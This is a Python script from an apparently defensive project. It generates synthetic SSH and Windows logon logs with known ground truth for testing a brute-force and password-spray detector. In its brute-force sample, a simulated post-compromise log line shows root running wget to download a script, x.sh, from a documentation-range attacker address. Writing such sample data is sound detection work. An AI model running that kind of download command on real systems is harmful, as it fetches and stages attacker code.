"""
Generate the sample logs, deterministically.

WHY A GENERATOR RATHER THAN HAND-WRITTEN FILES COMMITTED ONCE.

Three reasons, and the third is the important one.

1. Reproducible. Fixed seed, fixed base time, so the files are byte-identical every
   run and a diff means someone changed the generator, not the weather.

2. Honest. These logs are synthetic. Committing them without the code that made
   them invites a reader to assume they are real captures. They are not, and
   claiming otherwise in a portfolio project is the kind of thing that unravels
   badly in an interview.

3. The ground truth is known. This is the whole point. Because the generator knows
   exactly which IP attacked which account and when, the tests can assert the
   detector found THAT and nothing else. Testing a detector against a real log is
   almost impossible, because you do not know what is in it - you end up asserting
   "found 7 things" and never checking whether the 7 were right.

Run:  python samples/generate.py
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = datetime(2026, 11, 16, 9, 0, 0)
HOST = "ubuntu-vm"

# Fixed seed. Without this the "deterministic" claim above is false.
RNG = random.Random(20261116)

NORMAL_USERS = ["ayden", "deploy", "backup", "jenkins"]
OFFICE_IPS = ["192.168.1.10", "192.168.1.22", "192.168.1.45"]


def ts(offset_seconds: float) -> str:
    """Syslog timestamp. Note: no year. That absence is the parser's problem."""
    return (BASE + timedelta(seconds=offset_seconds)).strftime("%b %d %H:%M:%S")


def sshd(offset: float, message: str, pid: int | None = None) -> str:
    pid = pid or RNG.randint(1000, 9999)
    return f"{ts(offset)} {HOST} sshd[{pid}]: {message}"


def noise(offset: float) -> list[str]:
    """
    Lines that are NOT authentication attempts.

    Every real auth.log is full of these. They are in the samples on purpose: a
    parser that cannot ignore them will either crash or, worse, miscount. If your
    samples contain only the lines your parser handles, your parser is untested.
    """
    return [
        f"{ts(offset)} {HOST} CRON[{RNG.randint(1000,9999)}]: pam_unix(cron:session): "
        f"session opened for user root by (uid=0)",
        f"{ts(offset + 1)} {HOST} sudo: ayden : TTY=pts/0 ; PWD=/home/ayden ; "
        f"USER=root ; COMMAND=/usr/bin/apt update",
        f"{ts(offset + 2)} {HOST} systemd-logind[812]: New session 42 of user ayden.",
        f"{ts(offset + 3)} {HOST} sshd[{RNG.randint(1000,9999)}]: "
        f"Received disconnect from 192.168.1.10 port 51234:11: disconnected by user",
    ]


# ---------------------------------------------------------------------------
# 1. The clean log. THE MOST IMPORTANT FILE HERE.
# ---------------------------------------------------------------------------

def clean_log() -> list[str]:
    """
    A week of ordinary activity. The detector must find NOTHING in this.

    This file is the false-positive test, and it is the file that separates a real
    detection project from a demo. Anyone can write a rule that fires on an attack.
    The question a reviewer should be able to answer from your repo is "how often
    does it fire when nothing is happening", and that question is unanswerable
    without a known-clean sample.

    Deliberately included, because each one breaks a naive rule:

      - A human mistyping their password twice and then getting in. Two failures,
        under the threshold of 3, so success_after_failures must stay quiet. A rule
        that alerts on "any failure before a success" fires here, and would fire
        several times a day in production, and would be turned off within a week.

      - Scattered failures from one office IP across days. Four total, which is
        under 5, but more importantly they are hours apart - a rule using fixed
        daily buckets instead of a 60-second window could total them and alert.

      - A key-auth service account logging in constantly. High volume, all
        successful. A rule keyed on volume rather than failures fires here.

      - Internet background noise: single failed attempts from random IPs. Real,
        constant, and not actionable. One attempt each, so nothing should fire.
    """
    lines: list[str] = []

    for day in range(5):
        day_start = day * 86400

        # Service account, publickey, many times a day. Normal.
        for i in range(12):
            lines.append(sshd(day_start + 3600 * i + 5,
                              "Accepted publickey for deploy from 192.168.1.22 "
                              "port 51022 ssh2: RSA SHA256:abc123"))

        # A person logging in a few times.
        for i in range(3):
            off = day_start + 7200 * i + 120
            lines.append(sshd(off, "Accepted password for ayden from 192.168.1.10 "
                                   "port 51234 ssh2"))

        lines.extend(noise(day_start + 300))

    # The mistype. Two failures, 9 and 4 seconds before a success.
    lines.append(sshd(2 * 86400 + 4000, "Failed password for ayden from "
                                        "192.168.1.10 port 51400 ssh2"))
    lines.append(sshd(2 * 86400 + 4005, "Failed password for ayden from "
                                        "192.168.1.10 port 51400 ssh2"))
    lines.append(sshd(2 * 86400 + 4009, "Accepted password for ayden from "
                                        "192.168.1.10 port 51400 ssh2"))

    # Scattered failures from one office IP, hours apart across the week.
    for day, hour in [(0, 3), (1, 7), (3, 2), (4, 6)]:
        lines.append(sshd(day * 86400 + hour * 3600 + 17,
                          "Failed password for backup from 192.168.1.45 "
                          "port 49900 ssh2"))

    # Internet background noise. One attempt each from different sources.
    #
    # EVERY ADDRESS IN THESE SAMPLES IS FROM A RESERVED DOCUMENTATION RANGE
    # (RFC 5737: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) or is private
    # (RFC 1918). None of them routes to a real machine.
    #
    # This matters because the repository is public and these addresses are
    # labelled as attackers. Inventing an address that looks plausible means
    # eventually publishing a real one belonging to a real person or company,
    # accused of something it did not do. The reserved ranges exist precisely so
    # that examples never do that.
    for i, ip in enumerate(["192.0.2.11", "192.0.2.47", "192.0.2.88",
                            "192.0.2.150", "192.0.2.203"]):
        lines.append(sshd(i * 86400 + 5400,
                          f"Failed password for invalid user admin from {ip} "
                          f"port {40000 + i} ssh2"))

    return sort_syslog(lines)


# ---------------------------------------------------------------------------
# 2. Brute force, ending in a compromise
# ---------------------------------------------------------------------------

def bruteforce_log() -> list[str]:
    """
    203.0.113.9 hammers root and admin, then gets in as root.

    GROUND TRUTH
        brute_force             1 finding, 203.0.113.9, severity high
        success_after_failures  1 finding, user root
        password_spray          0 findings - only 2 usernames, nowhere near 10

    That last line is the one to check. If your spray rule fires here it is counting
    distinct usernames without the per-user cap, and it will mislabel every brute
    force as a spray.
    """
    lines = list(clean_background())
    attacker = "203.0.113.9"

    # 46 failures over ~4 minutes, alternating root and admin. Roughly 11 per
    # 60-second window, so it clears the threshold of 5 comfortably.
    for i in range(46):
        user = "root" if i % 2 == 0 else "admin"
        off = 3600 + i * 5.2
        if user == "admin":
            lines.append(sshd(off, f"Failed password for invalid user admin "
                                   f"from {attacker} port {40000 + i} ssh2"))
        else:
            lines.append(sshd(off, f"Failed password for root from {attacker} "
                                   f"port {40000 + i} ssh2"))

    # And then it works. This is the line that turns an attack into an incident.
    lines.append(sshd(3600 + 46 * 5.2 + 3,
                      f"Accepted password for root from {attacker} port 40100 ssh2"))

    # Post-compromise activity, so the log tells a complete story.
    lines.append(f"{ts(3600 + 46 * 5.2 + 9)} {HOST} sudo: root : TTY=pts/1 ; "
                 f"PWD=/root ; USER=root ; COMMAND=/usr/bin/wget "
                 f"http://203.0.113.200/x.sh")

    return sort_syslog(lines)


# ---------------------------------------------------------------------------
# 3. Password spraying
# ---------------------------------------------------------------------------

def spray_log() -> list[str]:
    """
    198.51.100.7 tries two passwords against 14 accounts over ~8 minutes.

    GROUND TRUTH
        password_spray          1 finding, 198.51.100.7, 14 accounts, max 2 each
        brute_force             0 findings
        success_after_failures  0 findings

    Check brute_force stays quiet. 28 failures total, but spread over 8 minutes they
    never reach 5 inside any 60-second window - which is precisely the point of
    spraying, and precisely why a brute-force-only detector misses it.
    """
    lines = list(clean_background())
    attacker = "198.51.100.7"
    targets = ["admin", "administrator", "test", "guest", "oracle", "postgres",
               "ubuntu", "ftp", "git", "jenkins", "tomcat", "nagios",
               "www-data", "support"]

    off = 3600.0
    for user in targets:
        for _ in range(2):
            lines.append(sshd(off, f"Failed password for invalid user {user} "
                                   f"from {attacker} port {int(off) % 60000} ssh2"))
            off += 17.0

    return sort_syslog(lines)


def clean_background() -> list[str]:
    """A little normal traffic, so the attack logs are not suspiciously tidy."""
    out = []
    for i in range(6):
        out.append(sshd(600 * i, "Accepted publickey for deploy from "
                                 "192.168.1.22 port 51022 ssh2: RSA SHA256:abc123"))
    out.extend(noise(1200))
    return out


# ---------------------------------------------------------------------------
# 4. Windows
# ---------------------------------------------------------------------------

def windows_csv() -> list[str]:
    """
    A Security log export. Brute force over RDP, then a success.

    GROUND TRUTH
        brute_force             1 finding, 10.0.0.66
        success_after_failures  1 finding, user administrator
        password_spray          0 findings

    Also included and expected to be IGNORED entirely:
      - LogonType 2 rows: physical console logons. No attacker is sitting at the
        keyboard; counting these would add noise on every machine.
      - LogonType 5 rows: a service starting. Constant on any Windows box.
      - An event ID 4672 row: "special privileges assigned". Not an auth attempt.
        Present to confirm the parser skips IDs it does not handle instead of
        choking on them.
    """
    rows = ["TimeCreated,EventID,Computer,TargetUserName,IpAddress,LogonType,SubStatus"]

    def row(offset: float, eid: str, user: str, ip: str,
            logon: str, sub: str = "") -> str:
        t = (BASE + timedelta(seconds=offset)).strftime("%Y-%m-%d %H:%M:%S")
        return f"{t},{eid},WIN-DC01,{user},{ip},{logon},{sub}"

    # Noise that must be filtered out.
    rows.append(row(0, "4624", "ayden", "-", "2"))
    rows.append(row(30, "4624", "SYSTEM", "-", "5"))
    rows.append(row(45, "4672", "SYSTEM", "-", "5"))

    # Legitimate remote logon.
    rows.append(row(120, "4624", "ayden", "192.168.1.10", "10"))

    # The attack: 24 failures in ~3 minutes from 10.0.0.66.
    for i in range(24):
        user = "administrator" if i % 3 else "admin"
        sub = "0xC0000064" if user == "admin" else "0xC000006A"
        rows.append(row(1800 + i * 7, "4625", user, "10.0.0.66", "3", sub))

    # It works.
    rows.append(row(1800 + 24 * 7 + 4, "4624", "administrator", "10.0.0.66", "10"))

    return rows


# ---------------------------------------------------------------------------

def sort_syslog(lines: list[str]) -> list[str]:
    """
    Sort by the timestamp text.

    Works only because every sample is inside one month, where lexical order on
    "Nov 16 09:12:03" matches chronological order. It would break across a month
    boundary. Fine for a generator, and exactly the kind of shortcut that must NOT
    appear in the parser, which sorts on real datetimes instead.
    """
    return sorted(lines, key=lambda s: s[:15])


FILES = {
    "auth_clean.log": clean_log,
    "auth_bruteforce.log": bruteforce_log,
    "auth_spray.log": spray_log,
    "windows_security.csv": windows_csv,
}


def main() -> None:
    for name, fn in FILES.items():
        path = HERE / name
        lines = fn()
        path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        print(f"wrote {path.relative_to(HERE.parent)}  ({len(lines)} lines)")


if __name__ == "__main__":
    main()
